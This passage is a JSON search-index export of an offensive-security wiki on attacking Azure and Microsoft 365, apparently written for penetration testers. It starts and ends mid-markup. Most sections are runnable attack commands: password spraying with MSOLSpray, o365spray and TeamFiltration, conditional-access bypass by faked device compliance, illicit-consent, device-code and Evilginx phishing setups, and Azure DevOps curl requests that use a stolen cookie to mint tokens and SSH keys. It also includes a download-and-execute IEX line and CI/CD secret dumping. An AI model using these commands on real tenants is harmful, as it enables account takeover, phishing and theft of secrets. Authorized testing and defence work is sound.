</ul>"},{"location":"cloud/azure/azure-enumeration/#enumerate-from-a-guest-account","title":"Enumerate from a Guest Account","text":"<pre><code>powerpwn recon --tenant {tenantId} --cache-path {path}\npowerpwn dump -tenant {tenantId} --cache-path {path}\npowerpwn gui --cache-path {path}\n</code></pre>"},{"location":"cloud/azure/azure-enumeration/#enumerate-emails","title":"Enumerate Emails","text":"<p>By default, O365 has a lockout policy of 10 tries, and it will lock out an account for one (1) minute.</p> <ul> <li>Validate email      <pre><code>PS&gt; C:\\Python27\\python.exe C:\\Tools\\o365creeper\\o365creeper.py -f C:\\Tools\\emails.txt -o C:\\Tools\\validemails.txt\nadmin@&lt;TENANT NAME&gt;.onmicrosoft.com   - VALID\nroot@&lt;TENANT NAME&gt;.onmicrosoft.com    - INVALID\ntest@&lt;TENANT NAME&gt;.onmicrosoft.com    - VALID\ncontact@&lt;TENANT NAME&gt;.onmicrosoft.com - INVALID\n</code></pre></li> <li>Extract email lists with a valid credentials : https://github.com/nyxgeek/o365recon     <pre><code>Install-Module MSOnline\nInstall-Module AzureAD\n.\\o365recon.ps1 -azure\n</code></pre></li> </ul>"},{"location":"cloud/azure/azure-enumeration/#password-spraying","title":"Password Spraying","text":"<p>The default lockout policy tolerates 10 failed attempts, then lock out an account for 60 seconds.</p> <ul> <li>dafthack/MSOLSpray <pre><code>PS&gt; . C:\\Tools\\MSOLSpray\\MSOLSpray.ps1\nPS&gt; Invoke-MSOLSpray -UserList C:\\Tools\\validemails.txt -Password &lt;PASSWORD&gt; -Verbose\nPS&gt; Invoke-MSOLSpray -UserList .\\userlist.txt -Password Winter2020\nPS&gt; Invoke-MSOLSpray -UserList .\\users.txt -Password d0ntSprayme!\n</code></pre></li> <li>0xZDH/o365spray <pre><code>o365spray --spray -U usernames.txt -P passwords.txt --count 2 --lockout 5 --domain test.com\n</code></pre></li> <li>Flangvik/TeamFiltration <pre><code>TeamFiltration.exe --outpath  C:\\Clients\\2023\\FooBar\\TFOutput --config myCustomConfig.json --spray --sleep-min 120 --sleep-max 200 --push --shuffle-users --shuffle-regions\nTeamFiltration.exe --outpath  C:\\Clients\\2023\\FooBar\\TFOutput --config myCustomConfig.json --spray --push-locked --months-only --exclude C:\\Clients\\2021\\FooBar\\Exclude_Emails.txt\nTeamFiltration.exe --outpath  C:\\Clients\\2023\\FooBar\\TFOutput --config myCustomConfig.json --spray --passwords C:\\Clients\\2021\\FooBar\\Generic\\Passwords.txt --time-window 13:00-22:00\n</code></pre></li> </ul>"},{"location":"cloud/azure/azure-enumeration/#azure-services-enumeration","title":"Azure Services Enumeration","text":""},{"location":"cloud/azure/azure-enumeration/#enumerate-tenant-domains","title":"Enumerate Tenant Domains","text":"<p>Extract openly available information for the given tenant: aadinternals.com/osint</p> <pre><code>Invoke-AADIntReconAsOutsider -DomainName &lt;DOMAIN&gt;\nInvoke-AADIntReconAsOutsider -Domain \"company.com\" | Format-Table\nInvoke-AADIntReconAsOutsider -UserName \"user@company.com\" | Format-Table\n</code></pre>"},{"location":"cloud/azure/azure-enumeration/#enumerate-azure-subdomains","title":"Enumerate Azure Subdomains","text":"<pre><code>PS&gt; . C:\\Tools\\MicroBurst\\Misc\\InvokeEnumerateAzureSubDomains.ps1\nPS&gt; Invoke-EnumerateAzureSubDomains -Base &lt;TENANT NAME&gt; -Verbose\nSubdomain Service\n--------- -------\n&lt;TENANT NAME&gt;.mail.protection.outlook.com Email\n&lt;TENANT NAME&gt;.onmicrosoft.com Microsoft Hosted Domain\n</code></pre>"},{"location":"cloud/azure/azure-enumeration/#enumerate-services","title":"Enumerate Services","text":"<ul> <li> <p>Using Az Powershell module     <pre><code># Enumerate resources\nPS Az&gt; Get-AzResource\n\n# List all VM's the user has access to\nPS Az&gt; Get-AzVM \n\n# Get all webapps\nPS Az&gt; Get-AzWebApp | ?{$_.Kind -notmatch \"functionapp\"}\n\n# Get all function apps\nPS Az&gt; Get-AzFunctionApp\n\n# List all storage accounts\nPS Az&gt; Get-AzStorageAccount\n\n# List all keyvaults\nPS Az&gt; Get-AzKeyVault\n\n# Get all application objects registered using the current tenant\nPS AzureAD&gt; Get-AzureADApplication -All $true\n\n# Enumerate role assignments\nPS Az&gt; Get-AzRoleAssignment -Scope /subscriptions/&lt;SUBSCRIPTION-ID&gt;/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/&lt;VM-NAME&gt;\nPS Az&gt; Get-AzRoleAssignment -SignInName test@&lt;TENANT NAME&gt;.onmicrosoft.com\n\n# Check AppID Alternative Names/Display Name \nPS AzureAD&gt; Get-AzureADServicePrincipal -All $True | ?{$_.AppId -eq \"&lt;APP-ID&gt;\"} | fl\n</code></pre></p> </li> <li> <p>Using az cli     <pre><code>PS&gt; az vm list\nPS&gt; az vm list --query \"[].[name]\" -o table\nPS&gt; az webapp list\nPS&gt; az functionapp list --query \"[].[name]\" -o table\nPS&gt; az storage account list\nPS&gt; az keyvault list\n</code></pre></p> </li> </ul>"},{"location":"cloud/azure/azure-enumeration/#conditional-access-policy","title":"Conditional Access Policy","text":"<p>Conditional Access is used to restrict access to resources to compliant devices only.</p> <ul> <li>Enumerate Conditional Access Policies: <code>roadrecon plugin policies</code> (query the local database)</li> </ul> CAP Bypass Location / IP ranges Corporate VPN, Guest Wifi Platform requirement User-Agent switcher (Android, PS4, Linux, ...) Protocol requirement Use another protocol (e.g for e-mail acccess:  POP, IMAP, SMTP) Azure AD Joined Device Try to join a VM (Work Access) Compliant Device (Intune) Fake device compliance Device requirement / MFA / Legacy Protocols / Domain Joined / <p>Bypassing conditional access by faking device compliance</p> <pre><code># AAD Internals - Making your device compliant\n# Get an access token for AAD join and save to cache\nGet-AADIntAccessTokenForAADJoin -SaveToCache\n# Join the device to Azure AD\nJoin-AADIntDeviceToAzureAD -DeviceName \"SixByFour\" -DeviceType \"Commodore\" -OSVersion \"C64\"\n# Marking device compliant - option 1: Registering device to Intune\n# Get an access token for Intune MDM and save to cache (prompts for credentials)\nGet-AADIntAccessTokenForIntuneMDM -PfxFileName .\\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx -SaveToCache \n# Join the device to Intune\nJoin-AADIntDeviceToIntune -DeviceName \"SixByFour\"\n# Start the call back\nStart-AADIntDeviceIntuneCallback -PfxFileName .\\d03994c9-24f8-41ba-a156-1805998d6dc7-MDM.pfx -DeviceName \"SixByFour\"\n</code></pre>"},{"location":"cloud/azure/azure-enumeration/#multi-factor-authentication","title":"Multi Factor Authentication","text":"<ul> <li>dafthack/MFASweep - A tool for checking if MFA is enabled on multiple Microsoft Services <pre><code>Import-Module .\\MFASweep.ps1\nInvoke-MFASweep -Username targetuser@targetdomain.com -Password Winter2020\nInvoke-MFASweep -Username targetuser@targetdomain.com -Password Winter2020 -Recon -IncludeADFS\n</code></pre></li> </ul>"},{"location":"cloud/azure/azure-enumeration/#references","title":"References","text":"<ul> <li>Bypassing conditional access by faking device compliance - @DrAzureAD - September 06, 2020</li> <li>CARTP-cheatsheet - Azure AD cheatsheet for the CARTP course</li> <li>Attacking Azure/Azure AD and introducing Powerzure - SpecterOps - Ryan Hausknecht - Jan 28, 2020</li> </ul>"},{"location":"cloud/azure/azure-persistence/","title":"Azure Persistence","text":""},{"location":"cloud/azure/azure-persistence/#add-secrets-to-application","title":"Add Secrets to Application","text":"<ul> <li> <p>Add secrets with lutzenfried/OffensiveCloud/Add-AzADAppSecret.ps1 <pre><code>PS &gt; . C:\\Tools\\Add-AzADAppSecret.ps1\nPS &gt; Add-AzADAppSecret -GraphToken $graphtoken -Verbose\n</code></pre></p> </li> <li> <p>Use secrets to authenticate as Service Principal     <pre><code>PS &gt; $password = ConvertTo-SecureString '&lt;SECRET/PASSWORD&gt;' -AsPlainText -Force\nPS &gt; $creds = New-Object System.Management.Automation.PSCredential('&lt;AppID&gt;', $password)\nPS &gt; Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant '&lt;TenantID&gt;'\n</code></pre></p> </li> </ul>"},{"location":"cloud/azure/azure-persistence/#add-service-principal","title":"Add Service Principal","text":"<ul> <li>Generate a new service principal password/secret     <pre><code>Import-Module Microsoft.Graph.Applications\nConnect-MgGraph \n$servicePrincipalId = \"&lt;service-principal-id&gt;\"\n\n$params = @{\n    passwordCredential = @{\n        displayName = \"NewCreds\"\n    }\n}\nAdd-MgServicePrincipalPassword -ServicePrincipalId $servicePrincipalId -BodyParameter $params\n</code></pre></li> </ul>"},{"location":"cloud/azure/azure-persistence/#add-user-to-group","title":"Add User to Group","text":"<pre><code>Add-AzureADGroupMember -ObjectId &lt;group_id&gt; -RefObjectId &lt;user_id&gt; -Verbose\n</code></pre>"},{"location":"cloud/azure/azure-persistence/#references","title":"References","text":"<ul> <li>Maintaining Azure Persistence via automation accounts - Karl Fosaaen - September 12, 2019</li> <li>Microsoft Graph - servicePrincipal: addPassword</li> </ul>"},{"location":"cloud/azure/azure-phishing/","title":"Azure AD Phishing","text":""},{"location":"cloud/azure/azure-phishing/#illicit-consent-grant","title":"Illicit Consent Grant","text":"<p>The attacker creates an Azure-registered application that requests access to data such as contact information, email, or documents. The attacker then tricks an end user into granting consent to the application so that the attacker can gain access to the data that the target user has access to. </p> <p>Check if users are allowed to consent to apps: <code>PS AzureADPreview&gt; (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole</code></p> <ul> <li>Disable user consent : Users cannot grant permissions to applications.   </li> <li>Users can consent to apps from verified publishers or your organization, but only for permissions you select : All users can only consent to apps that were published by a verified publisher and apps that are registered in your tenant    </li> <li>Users can consent to all apps : allows all users to consent to any permission which doesn't require admin consent.    </li> <li>Custom app consent policy </li> </ul>"},{"location":"cloud/azure/azure-phishing/#register-application","title":"Register Application","text":"<ol> <li>Login to https://portal.azure.com &gt; Azure Active Directory</li> <li>Click on App registrations &gt; New registration</li> <li>Enter the Name for our application</li> <li>Under support account types select \"Accounts in any organizational directory (Any Azure AD directory - Multitenant)\"</li> <li>Enter the Redirect URL. This URL should be pointed towards our 365-Stealer application that we will host for hosting our phishing page. Make sure the endpoint is <code>https://&lt;DOMAIN/IP&gt;:&lt;PORT&gt;/login/authorized</code>.</li> <li>Click Register and save the Application ID</li> </ol>"},{"location":"cloud/azure/azure-phishing/#configure-application","title":"Configure Application","text":"<ol> <li>Click on <code>Certificates &amp; secrets</code></li> <li>Click on <code>New client secret</code> then enter the Description and click on Add.</li> <li>Save the secret's value.</li> <li>Click on API permissions &gt; Add a permission</li> <li>Click on Microsoft Graph &gt; Delegated permissions</li> <li>Search and select the below mentioned permissions and click on Add permission<ul> <li>Contacts.Read </li> <li>Mail.Read / Mail.ReadWrite</li> <li>Mail.Send</li> <li>Notes.Read.All</li> <li>Mailboxsettings.ReadWrite</li> <li>Files.ReadWrite.All </li> <li>User.ReadBasic.All</li> <li>User.Read</li> </ul> </li> </ol>"},{"location":"cloud/azure/azure-phishing/#setup-365-stealer-deprecated","title":"Setup 365-Stealer (Deprecated)","text":"<p> Default port for 365-Stealer phishing is 443</p> <ul> <li>Run XAMPP and start Apache</li> <li>Clone 365-Stealer into <code>C:\\xampp\\htdocs\\</code><ul> <li><code>git clone https://github.com/AlteredSecurity/365-Stealer.git</code></li> </ul> </li> <li>Install the requirements<ul> <li>Python3</li> <li>PHP CLI or Xampp server</li> <li><code>pip install -r requirements.txt</code></li> </ul> </li> <li>Enable sqlite3 (Xampp &gt; Apache config &gt; php.ini) and restart Apache</li> <li>Edit <code>C:/xampp/htdocs/yourvictims/index.php</code> if needed<ul> <li>Disable IP whitelisting <code>$enableIpWhiteList = false;</code></li> </ul> </li> <li>Go to 365-Stealer Management portal &gt; Configuration (http://localhost:82/365-stealer/yourVictims)<ul> <li>Client Id (Mandatory): This will be the Application(Client) Id of the application that we registered.</li> <li>Client Secret (Mandatory): Secret value from the Certificates &amp; secrets tab that we created.</li> <li>Redirect URL (Mandatory): Specify the redirect URL that we entered during registering the App like <code>https://&lt;Domain/IP&gt;/login/authorized</code> </li> <li>Macros Location: Path of macro file that we want to inject.</li> <li>Extension in OneDrive: We can provide file extensions that we want to download from the victims account or provide <code>*</code> to download all the files present in the victims OneDrive. The file extensions should be comma separated like txt, pdf, docx etc. </li> <li>Delay: Delay the request by specifying time in seconds while stealing</li> </ul> </li> <li>Create a Self Signed Certificate to use HTTPS</li> <li>Run the application either click on the button or run this command : <code>python 365-Stealer.py --run-app</code><ul> <li><code>--no-ssl</code>: disable HTTPS</li> <li><code>--port</code>: change the default listening port</li> <li><code>--token</code>: provide a specific token</li> <li><code>--refresh-token XXX --client-id YYY --client-secret ZZZ</code>: use a refresh token</li> </ul> </li> <li>Find the Phishing URL: go to <code>https://&lt;IP/Domain&gt;:&lt;Port&gt;</code> and click on Read More button or in the console.</li> </ul>"},{"location":"cloud/azure/azure-phishing/#vajra","title":"Vajra","text":"<p>Vajra is a UI-based tool with multiple techniques for attacking and enumerating in the target's Azure environment. It features an intuitive web-based user interface built with the Python Flask module for a better user experience. The primary focus of this tool is to have different attacking techniques all at one place with web UI interfaces. - https://github.com/TROUBLE-1/Vajra</p> <p>Mitigation: Enable <code>Do not allow user consent</code> for applications in the \"Consent and permissions menu\".</p>"},{"location":"cloud/azure/azure-phishing/#roadtx","title":"Roadtx","text":"<ul> <li>Use the authorization code flow in roadtx to get token <pre><code>roadtx codeauth -c &lt;app-id&gt; -r msgraph -t &lt;tenant-id&gt; &lt;0.A....&gt; -ru 'https://&lt;phish-app&gt;/redir' -p &lt;app-secret&gt;\n</code></pre></li> </ul>"},{"location":"cloud/azure/azure-phishing/#device-code-phishing","title":"Device Code Phishing","text":"<ul> <li> <p>Using roadtool: <code>roadtx gettokens -u user@domain.lab --device-code</code> <pre><code>roadtx.exe auth --device-code -c 29d9ed98-a469-4536-ade2-f981bc1d605e\nRequesting token for resource https://graph.windows.net\nTo sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code XXXXXXXXX to authenticate.\n</code></pre></p> </li> <li> <p>Using TokenTactics to request a token for Azure Graph API using a device code     <pre><code>Import-Module .\\TokenTactics.psd1\nGet-AzureToken -Client Graph\n</code></pre></p> </li> <li>Replace <code>&lt;REPLACE-WITH-DEVCODE-FROM-TOKENTACTICS&gt;</code> in the phishing email</li> <li>Leave TokenTactics running in the PowerShell window and send the phishing email</li> <li>Targeted user will follow the link to https://microsoft.com/devicelogin and complete the Device Code form</li> <li>Enjoy your access token and refresh token</li> </ul>"},{"location":"cloud/azure/azure-phishing/#phishing-with-evilginx2","title":"Phishing with Evilginx2","text":"<ul> <li>Run kgretzky/evilginx2 with o365 phishlet     <pre><code>PS C:\\Tools&gt; evilginx2 -p C:\\Tools\\evilginx2\\phishlets\n: config domain username.corp\n: config ip 10.10.10.10\n: phishlets hostname o365 login.username.corp\n: phishlets get-hosts o365\n</code></pre></li> <li>Create a DNS entry type A for <code>login.login.username.corp</code> and <code>www.login.username.corp</code>, pointing to your machine</li> <li>Copy certificate and enable the phishing     <pre><code>PS C:\\Tools&gt; Copy-Item C:\\Users\\Username\\.evilginx\\crt\\ca.crt C:\\Users\\Username\\.evilginx\\crt\\login.username.corp\\o365.crt\nPS C:\\Tools&gt; Copy-Item C:\\Users\\Username\\.evilginx\\crt\\private.key C:\\Users\\Username\\.evilginx\\crt\\login.username.corp\\o365.key\n: phishlets enable o365\n\n# get the phishing URL\n: lures create o365\n: lures get-url 0\n</code></pre></li> </ul>"},{"location":"cloud/azure/azure-phishing/#internal-phishing-power-platform","title":"Internal Phishing - Power Platform","text":"<p>Set up an internal phishing application on a Microsoft-owned domains which will automatically authenticate as users browse to your link.</p> <ul> <li>Install mbrg/power-pwn - An offensive and defensive security toolset for Microsoft 365 Power Platform     <pre><code>pip install powerpwn\n</code></pre></li> <li>Install the application: <code>powerpwn phishing install-app -t {tenant-id} -e {environment-id} --input {path to application package zip} -n {application name}</code></li> <li>Share application with org: <code>powerpwn phishing share-app -t {tenant-id} -e {environment-id} -a {app id}</code></li> </ul>"},{"location":"cloud/azure/azure-phishing/#references","title":"References","text":"<ul> <li>Introduction To 365-Stealer - Understanding and Executing the Illicit Consent Grant Attack</li> <li>Learn with @trouble1_raunak: Cloud Pentesting - Azure (Illicit Consent Grant Attack) - trouble1_raunak - Jun 6, 2021</li> <li>The Art of the Device Code Phish - Bobby Cooke - July 12, 2021</li> <li>Power Pwn - Black Hat Arsenal 2023 - Aug 24, 2023</li> <li>Low Code High Risk - Enterprise Domination via Low Code Abuse - Defcon 30 - Oct 20, 2022</li> </ul>"},{"location":"cloud/azure/azure-requirements/","title":"Azure Requirements","text":""},{"location":"cloud/azure/azure-requirements/#pentest-requirements","title":"Pentest Requirements","text":"<p>Users and roles: * Global Reader and Security Reader roles in Azure AD * Reader permission over the subscription</p> <p>Subscriptions: * Azure Dev/Test subscription. * Visual Studio subscription determines the monthly Azure credits you receive     * Visual Studio Enterprise: $150/month     * MSDN Platforms: $100     * Visual Studio Professional: $50     * Visual Studio Test Professional: $50</p>"},{"location":"cloud/azure/azure-requirements/#powershell-and-native-modules","title":"Powershell and Native Modules","text":"<ul> <li>Microsoft Graph: <code>Install-Module Microsoft.Graph -Scope CurrentUser</code></li> <li>Azure AD: <code>Install-Module AzureAD</code></li> <li>Azure AD Preview: <code>Install-Module AzureADPreview</code></li> <li>Azure CLI: <code>winget install -e --id Microsoft.AzureCLI</code></li> </ul>"},{"location":"cloud/azure/azure-requirements/#terminology","title":"Terminology","text":"<ul> <li>Tenant: An instance of Azure AD and represents a single organization.</li> <li>Azure AD Directory: Each tenant has a dedicated Directory. This is used to perform identity and access management functions for resources.</li> <li>Subscriptions: It is used to pay for services. There can be multiple subscriptions in a Directory.</li> <li>Core Domain: The initial domain name .onmicrosoft.com is the core domain. It is possible to define custom domain names too."},{"location":"cloud/azure/azure-requirements/#references","title":"References","text":"<ul> <li>Az - Permissions for a Pentest - HackTricks</li> <li>An introduction to penetration testing Azure - HollyGraceful - 06 August 2021</li> </ul>"},{"location":"cloud/azure/azure-services-application-endpoint/","title":"Azure Services - Application Endpoint","text":""},{"location":"cloud/azure/azure-services-application-endpoint/#enumerate","title":"Enumerate","text":"<ul> <li>Enumerate possible endpoints for applications starting/ending with PREFIX     <pre><code>PS C:\\Tools&gt; Get-AzureADServicePrincipal -All $true -Filter \"startswith(displayName,'PREFIX')\" | % {$_.ReplyUrls}\nPS C:\\Tools&gt; Get-AzureADApplication -All $true -Filter \"endswith(displayName,'PREFIX')\" | Select-Object ReplyUrls,WwwHomePage,HomePage\n</code></pre></li> </ul>"},{"location":"cloud/azure/azure-services-application-endpoint/#references","title":"References","text":""},{"location":"cloud/azure/azure-services-application-proxy/","title":"Azure Services - Application Proxy","text":""},{"location":"cloud/azure/azure-services-application-proxy/#enumerate","title":"Enumerate","text":"<ul> <li>Enumerate applications that have Proxy     <pre><code>PS C:\\Tools&gt; Get-AzureADApplication -All $true | %{try{GetAzureADApplicationProxyApplication -ObjectId $_.ObjectID;$_.DisplayName;$_.ObjectID}catch{}}\nPS C:\\Tools&gt; Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -eq \"Finance Management System\"}\n\nPS C:\\Tools&gt; . C:\\Tools\\GetApplicationProxyAssignedUsersAndGroups.ps1\nPS C:\\Tools&gt; Get-ApplicationProxyAssignedUsersAndGroups -ObjectId &lt;OBJECT-ID&gt;\n</code></pre></li> </ul>"},{"location":"cloud/azure/azure-services-application-proxy/#references","title":"References","text":""},{"location":"cloud/azure/azure-services-container-registry/","title":"Azure Services - Container Registry","text":""},{"location":"cloud/azure/azure-services-container-registry/#enumerate","title":"Enumerate","text":"<p>List container registries in the subscription using Azure CLI </p> <pre><code>az login -u user@domain.onmicrosoft.com -p pass\naz acr list -o table\n</code></pre> <p>Login to the Registry</p> <pre><code>acr=&lt;ACRName&gt; # from the previous command\nserver=$(az acr login -n $acr --expose-token --query loginServer -o tsv) \ntoken=$(az acr login -n $acr --expose-token --query accessToken -o tsv) \ndocker login $server -u 00000000-0000-0000-0000-000000000000 -p $token \n</code></pre> <p>List the images in the ACR</p> <pre><code>az acr repository list -n $acr \n</code></pre> <p>List version tags for an image <pre><code>az acr repository show-tags -n $acr --repository mywebapp\n</code></pre></p> <p>Connect to the container registry from a PowerShell console, set the $server and $token variables, and pull the image from the registry</p> <pre><code># docker login ${registryURI} --username ${username} --password ${password}\n$token=\"&lt;AccessToken&gt;\"\n$server=\"&lt;LoginServer&gt;\"\ndocker login $server -u 00000000-0000-0000-0000-000000000000 -p $token\ndocker pull $server/mywebapp:v1\n</code></pre> <p>List docker containers inside a registry</p> <pre><code>IEX (New-Object Net.WebClient).downloadstring(\"https://raw.githubusercontent.com/NetSPI/MicroBurst/master/Misc/Get-AzACR.ps1\")\nSet-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\" -Name \"DisableFirstRunCustomize\" -Value 2\nGet-AzACR -username ${username} -password ${password} -registry ${registryURI}\n</code></pre>"},{"location":"cloud/azure/azure-services-container-registry/#references","title":"References","text":"<ul> <li>PENTESTING AZURE: RECON TECHNIQUES - April 29, 2022 Stefan Tita</li> </ul>"},{"location":"cloud/azure/azure-services-deployment-template/","title":"Azure Services - Deployment Template","text":"<ul> <li>List the deployments     <pre><code>PS Az&gt; Get-AzResourceGroup\nPS Az&gt; Get-AzResourceGroupDeployment -ResourceGroupName SAP\n</code></pre></li> <li>Export the deployment template     <pre><code>PS Az&gt; Save-AzResourceGroupDeploymentTemplate -ResourceGroupName &lt;RESOURCE GROUP&gt; -DeploymentName &lt;DEPLOYMENT NAME&gt;\n\n# search for hardcoded password\ncat &lt;DEPLOYMENT NAME&gt;.json \ncat &lt;PATH TO .json FILE&gt; | Select-String password\n</code></pre></li> </ul>"},{"location":"cloud/azure/azure-services-deployment-template/#references","title":"References","text":""},{"location":"cloud/azure/azure-services-devops/","title":"Azure Services - Azure DevOps","text":"<ul> <li>xforcered/ADOKit - Azure DevOps Services Attack Toolkit</li> <li>synacktiv/nord-stream - Nord Stream is a tool that allows you to extract secrets stored inside CI/CD environments by deploying malicious pipelines. It currently supports Azure DevOps, GitHub and GitLab.     <pre><code># List all secrets from all projects\n$ nord-stream.py devops --token \"$PAT\" --org myorg --list-secrets\n\n# Dump all secrets from all projects\n$ nord-stream.py devops --token \"$PAT\" --org myorg\n</code></pre></li> </ul>"},{"location":"cloud/azure/azure-services-devops/#authentication","title":"Authentication","text":"<p>You can access an organization's Azure DevOps Services instance via https://dev.azure.com/{yourorganization}. </p> <ul> <li>Username and Password</li> <li>Authentication Cookie <code>UserAuthentication</code>: <code>ADOKit.exe whoami /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization</code></li> <li>Personal Access Token (PAT): <code>ADOKit.exe whoami /credential:patToken /url:https://dev.azure.com/YourOrganization</code> <pre><code>PAT=\"XXXXXXXXXXX\"\norganization=\"YOURORGANIZATION\"\ncurl -u :${PAT} https://dev.azure.com/${organization}/_apis/build-release/builds\n</code></pre></li> </ul>"},{"location":"cloud/azure/azure-services-devops/#recon","title":"Recon","text":"<ul> <li> <p>Search files: <code>file:FileNameToSearch</code>, <code>file:Test* OR file:azure-pipelines*</code> <pre><code>curl -i -s -k -X $'GET'\n-H $'Content-Type: application/json'\n-H $'User-Agent: SOME_USER_AGENT'\n-H $'Authorization: Basic BASE64ENCODEDPAT'\n-H $'Host: dev.azure.com'\n$'https://dev.azure.com/YOURORGANIZATION/PROJECTNAME/_apis/git/repositories/REPOSITORYID/items?recursionLevel=Full&amp;api-version=7.0'\n</code></pre></p> </li> <li> <p>Search code: <code>ADOKit.exe searchcode /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization /search:\"search term\"</code> <pre><code>curl -i -s -k -X $'POST'\n-H $'Content-Type: application/json'\n-H $'User-Agent: SOME_USER_AGENT'\n-H $'Authorization: Basic BASE64ENCODEDPAT'\n-H $'Host: almsearch.dev.azure.com'\n-H $'Content-Length: 85'\n-H $'Expect: 100-continue'\n-H $'Connection: close'\n--data-binary $'{\\\"searchText\\\": \\\"SEARCHTERM\\\", \\\"skipResults\\\":0,\\\"takeResults\\\":1000,\\\"isInstantSearch\\\":true}' \n$'https://almsearch.dev.azure.com/YOURORGANIZATION/_apis/search/codeAdvancedQueryResults?api-version=7.0-preview'\n</code></pre></p> </li> <li> <p>Enumerate users   <pre><code>curl -i -s -k -X $'GET'\n-H $'Content-Type: application/json'\n-H $'User-Agent: SOME_USER_AGENT'\n-H $'Authorization: Basic BASE64ENCODEDPAT'\n-H $'Host: dev.azure.com'\n$'https://dev.azure.com/YOURORGANIZATION/_apis/graph/users?api-version=7.0'\n</code></pre></p> </li> <li> <p>Enumerate groups: <code>ADOKit.exe getgroupmembers /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization /group:\"search term\"</code> <pre><code>curl -i -s -k -X $'GET'\n-H $'Content-Type: application/json'\n-H $'User-Agent: SOME_USER_AGENT'\n-H $'Authorization: Basic BASE64ENCODEDPAT'\n-H $'Host: dev.azure.com'\n$'https://dev.azure.com/YOURORGANIZATION/_apis/graph/groups?api-version=7.0'\n</code></pre></p> </li> <li> <p>Enumerate project permissions: <code>ADOKit.exe getpermissions /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization /project:\"project name\"</code></p> </li> </ul>"},{"location":"cloud/azure/azure-services-devops/#privilege-escalation","title":"Privilege Escalation","text":"<ul> <li> <p>Adding User to Group: <code>ADOKit.exe addcollectionbuildadmin /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization /user:\"username\"</code> <pre><code>curl -i -s -k -X $'PUT'\n-H $'Content-Type: application/json'\n-H $'User-Agent: Some User Agent'\n-H $'Authorization: Basic base64EncodedPAT'\n-H $'Host: vssps.dev.azure.com'\n-H $'Content-Length: 0'\n$'https://vssps.dev.azure.com/YourOrganization/_apis/graph/memberships/userDescriptor/groupDescriptor?api-version=7.0-preview.1'\n</code></pre></p> </li> <li> <p>Retrieve build variables and secrets: <code>ADOKit.exe getpipelinevars /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization /project:\"project name\"</code>, <code>ADOKit.exe getpipelinesecrets /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization /project:\"project name\"</code> <pre><code>curl -i -s -k -X $'GET'\n-H $'Content-Type: application/json'\n-H $'User-Agent: Some User Agent'\n-H $'Authorization: Basic base64EncodedPAT'\n-H $'Host: dev.azure.com'\n$'https://dev.azure.com/YourOrganization/ProjectName/_apis/build/Definitions/DefinitionIDNumber?api-version=7.0'\n</code></pre></p> </li> <li> <p>Retrieve Service Connection Information: <code>ADOKit.exe getserviceconnections /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization /project:\"project name\"</code> <pre><code>curl -i -s -k -X $'GET'\n-H $'Content-Type: application/json;api-version=5.0-preview.1'\n-H $'User-Agent: Some User Agent'\n-H $'Authorization: Basic base64EncodedPAT'\n-H $'Host: dev.azure.com'\n$'https://dev.azure.com/YourOrganization/YourProject/_apis/serviceendpoint/endpoints?api-version=7.0'\n</code></pre></p> </li> </ul>"},{"location":"cloud/azure/azure-services-devops/#persistence","title":"Persistence","text":"<ul> <li> <p>Create a PAT: <code>ADOKit.exe createpat /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization</code> <pre><code>curl -i -s -k -X $'POST'\n-H $'Content-Type: application/json'\n-H $'Accept: application/json;api-version=5.0-preview.1'\n-H $'User-Agent: Some User Agent'\n-H $'Host: dev.azure.com'\n-H $'Content-Length: 234'\n-H $'Expect: 100-continue'\n-b $'X-VSS-UseRequestRouting=True; UserAuthentication=stolenCookie'\n--data-binary $'{\\\"contributionIds\\\":[\\\"ms.vss-token-web.personal-accesstoken-issue-session-tokenprovider\\\"],\\\"dataProviderContext\\\":{\\\"properties\\\":{\\\"displayName\\\":\\\"PATName\\\",\\\"validTo\\\":\\\"YYYY-MMDDT00:00:00.000Z\\\",\\\"scope\\\":\\\"app_token\\\",\\\"targetAccounts\\\":[]}}}}}'\n$'https://dev.azure.com/YourOrganization/_apis/Contribution/HierarchyQuery'\n</code></pre></p> </li> <li> <p>Create SSH Keys: <code>ADOKit.exe createsshkey /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization /sshkey:\"ssh pub key\"</code> <pre><code>curl -i -s -k -X $'POST'\n-H $'Content-Type: application/json'\n-H $'Accept: application/json;api-version=5.0-preview.1'\n-H $'User-Agent: Some User Agent'\n-H $'Host: dev.azure.com'\n-H $'Content-Length: 856'\n-H $'Expect: 100-continue'\n-b $'X-VSS-UseRequestRouting=True; UserAuthentication=stolenCookie'\n--data-binary $'{\\\"contributionIds\\\":[\\\"ms.vss-token-web.personal-accesstoken-issue-session-tokenprovider\\\"],\\\"dataProviderContext\\\":{\\\"properties\\\":{\\\"displayName\\\":\\\"SSHKeyName\\\",\\\"publicData\\\":\\\"public SSH key content\\\",\\\"validTo\\\":\\\"YYYY-MMDDT00:00:00.000Z\\\",\\\"scope\\\":\\\"app_token\\\",\\\"isPublic\\\":true,\\\"targetAccounts\\\":[\\\"organizationID\\\"]}}}}}'\n$'https://dev.azure.com/YourOrganization/_apis/Contribution/HierarchyQuery'\n</code></pre></p> </li> </ul>"},{"location":"cloud/azure/azure-services-devops/#references","title":"References","text":"<ul> <li>Hiding in the Clouds: Abusing Azure DevOps Services to Bypass Microsoft Sentinel Analytic Rules - Brett Hawkins - November 6, 2023</li> </ul>"},{"location":"cloud/azure/azure-services-keyvault/","title":"Azure Services - KeyVault","text":""},{"location":"cloud/azure/azure-services-keyvault/#access-token","title":"Access Token","text":"<ul> <li> <p>Keyvault access token     <pre><code>curl 